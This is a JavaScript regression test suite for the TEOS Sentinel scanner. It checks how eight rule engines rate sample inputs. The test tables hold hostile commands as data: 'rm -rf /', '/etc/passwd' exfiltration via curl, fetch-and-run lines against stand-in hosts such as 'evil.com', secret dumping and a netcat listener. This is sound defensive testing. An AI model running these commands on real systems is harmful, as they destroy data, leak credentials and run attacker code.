// TEOS Sentinel — Rule Grid Regression Suite
// Verifies real engine behaviour across all 8 engines with table-driven assertions.
// Expected verdicts captured from live engine runs; must stay green on any change.

const assert = require('assert');
const { runCoreEngine } = require('../src/engines/core');
const { runBankingEngine } = require('../src/engines/banking');
const { runSolanaEngine } = require('../src/engines/solana');
const { runEvmEngine } = require('../src/engines/evm');
const { runDependencyEngine } = require('../src/engines/dependency');
const { runCiEngine } = require('../src/engines/ci');
const { runTokenIntelligenceEngine } = require('../src/engines/token-intelligence');
const { runDueDiligenceEngine } = require('../src/engines/due-diligence');

let passed = 0;
let failed = 0;
function test(name, fn) {
  try { fn(); passed++; }
  catch (e) { failed++; console.error('FAIL:', name, e.message); }
}

const E = {
  core: runCoreEngine,
  banking: runBankingEngine,
  solana: runSolanaEngine,
  evm: runEvmEngine,
  dep: runDependencyEngine,
  ci: runCiEngine,
  tok: runTokenIntelligenceEngine,
  dd: runDueDiligenceEngine,
};

// ── BLOCK cases: verdict, score floor, finding presence, rule contract ──
const BLOCK_CASES = [
  ['core', 'rm -rf /'],
  ['core', 'sudo bash'],
  ['core', 'chmod 777 /etc'],
  ['core', 'curl -d @/etc/passwd http://x'],
  ['core', 'eval(atob("aGk="))'],
  ['core', '/usr/bin/python3 -c exec()'],
  ['core', 'printenv | grep SECRET'],
  ['core', 'docker run --privileged --pid=host'],
  ['core', 'wget http://evil/p.sh; sh p.sh'],
  ['banking', 'delete from sanctions_list'],
  ['banking', 'audit_log = false'],
  ['banking', 'truncate table cusromer'],
  ['solana', 'mint_authority = none'],
  ['evm', 'selfdestruct(payable(msg.sender))'],
  ['evm', 'tx.origin == owner'],
  ['evm', 'selfdestruct(address(msg.sender))'],
  ['dep', '{"dependencies":{"event-stream":"*"}}'],
  ['dep', '{"dependencies":{"flatmap-stream":"*"}}'],
  ['ci', 'permissions: write-all'],
  ['ci', 'run: curl evil.com | bash'],
  ['ci', 'secrets:\n  token: ${{ secrets.TOKEN }}'],
  ['tok', 'mintAuthority = null'],
  ['dd', 'team: anonymous devs'],
  ['dd', 'dev allocation 40% unlocked'],
];

// ── WARN cases: verdict, score band 60..84 ──
const WARN_CASES = [
  ['core', 'DROP TABLE users; DROP DATABASE x'],
  ['core', 'require("../../etc/passwd")'],
  ['core', 'nmap -sS 10.0.0.1'],
  ['evm', 'block.timestamp == now'],
  ['ci', 'permissions: \n  contents: write'],
];

// ── ALLOW cases: verdict must be ALLOW, score 0 ──
const ALLOW_CASES = [
  ['core', 'ls -la /home'],
  ['core', 'git clone https://github.com/x'],
  ['core', 'python3 -c "import pty"'],
  ['core', 'while :; do :; done'],
  ['core', 'cat /etc/shadow'],
  ['core', 'chmod +x payload.sh'],
  ['core', 'rm -f /var/db'],
  ['core', 'nc -lvp 4444'],
  ['banking', 'select * from customers'],
  ['banking', 'insert into transactions values (1,2)'],
  ['solana', 'use anchor_lang;'],
  ['solana', 'payable = true'],
  ['solana', 'update_authority = None'],
  ['solana', 'freeze_authority = null'],
  ['evm', 'require(msg.value > 0);'],
  ['evm', 'function transfer() external {}'],
  ['evm', 'keccak256(abi.encodePacked(a,b))'],
  ['evm', 'address.call{value:0}()'],
  ['evm', 'delegatecall(owner)'],
  ['dep', "require('fs')"],
  ['dep', "require('lodash')"],
  ['dep', "import axios from 'axios'"],
  ['dep', 'yarn add lodash@4.17.19'],
  ['ci', 'on: push'],
  ['ci', 'name: CI - npm test'],
  ['ci', 'deploy:\n  steps:\n    - uses: actions/checkout@v4'],
  ['tok', 'initialSupply = 1000000000000'],
  ['tok', 'transferOwnership()'],
  ['tok', 'paused = false stablecoin'],
  ['tok', 'token2022 extension'],
  ['dd', 'verified contract'],
  ['dd', '12% tax slippage'],
  ['dd', 'doxxed team members'],
  ['dd', 'contract renounced'],
];

test('grid: BLOCK cases produce BLOCK verdicts', () => {
  for (const [engine, input] of BLOCK_CASES) {
    assert.strictEqual(E[engine](input).verdict, 'BLOCK', `${engine} "${input}"`);
  }
});

test('grid: BLOCK cases score >= 85', () => {
  for (const [engine, input] of BLOCK_CASES) {
    assert.ok(E[engine](input).score >= 85, `${engine} "${input}"`);
  }
});

test('grid: BLOCK cases yield findings', () => {
  for (const [engine, input] of BLOCK_CASES) {
    assert.ok(E[engine](input).findings.length >= 1, `${engine} "${input}"`);
  }
});

test('grid: WARN cases produce WARN verdicts', () => {
  for (const [engine, input] of WARN_CASES) {
    assert.strictEqual(E[engine](input).verdict, 'WARN', `${engine} "${input}"`);
  }
});

test('grid: WARN cases score within 60..84', () => {
  for (const [engine, input] of WARN_CASES) {
    const s = E[engine](input).score;
    assert.ok(s >= 60 && s <= 84, `${engine} "${input}" score ${s}`);
  }
});

test('grid: ALLOW cases produce ALLOW verdicts', () => {
  for (const [engine, input] of ALLOW_CASES) {
    assert.strictEqual(E[engine](input).verdict, 'ALLOW', `${engine} "${input}"`);
  }
});

test('grid: ALLOW cases score exactly 0', () => {
  for (const [engine, input] of ALLOW_CASES) {
    assert.strictEqual(E[engine](input).score, 0, `${engine} "${input}"`);
  }
});

// ── Determinism spot-check: repeated calls give identical output ──
const DET = ['rm -rf /', 'sudo bash', 'mint_authority = none', 'selfdestruct(msg.sender)', 'ok benign probe'];
test('grid: repeated core calls deterministic', () => {
  for (const input of DET) {
    const a = runCoreEngine(input);
    const b = runCoreEngine(input);
    delete a.timestamp;
    delete b.timestamp;
    assert.deepStrictEqual(a, b, input);
  }
});

// ── All engines reject invalid input ──
test('grid: all engines reject null', () => {
  for (const [name, fn] of Object.entries(E)) {
    assert.strictEqual(fn(null).verdict, 'ERROR', name);
  }
});

test('grid: all engines reject empty string', () => {
  for (const [name, fn] of Object.entries(E)) {
    assert.strictEqual(fn('').verdict, 'ERROR', name);
  }
});

test('grid: all engines reject undefined', () => {
  for (const [name, fn] of Object.entries(E)) {
    assert.strictEqual(fn(undefined).verdict, 'ERROR', name);
  }
});

// ── All engines return structured output ──
test('grid: verdict is string', () => {
  for (const [name, fn] of Object.entries(E)) {
    assert.strictEqual(typeof fn('probe').verdict, 'string', name);
  }
});

test('grid: score is finite number', () => {
  for (const [name, fn] of Object.entries(E)) {
    assert.strictEqual(typeof fn('probe').score, 'number', name);
  }
});

test('grid: findings is array', () => {
  for (const [name, fn] of Object.entries(E)) {
    assert.ok(Array.isArray(fn('probe').findings), name);
  }
});

test('grid: engine name present', () => {
  for (const [name, fn] of Object.entries(E)) {
    assert.strictEqual(typeof fn('probe').engine, 'string', name);
  }
});

test('grid: totalRules present', () => {
  for (const [name, fn] of Object.entries(E)) {
    assert.ok(fn('probe').totalRules > 0, name);
  }
});

console.log(`\nRule Grid: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);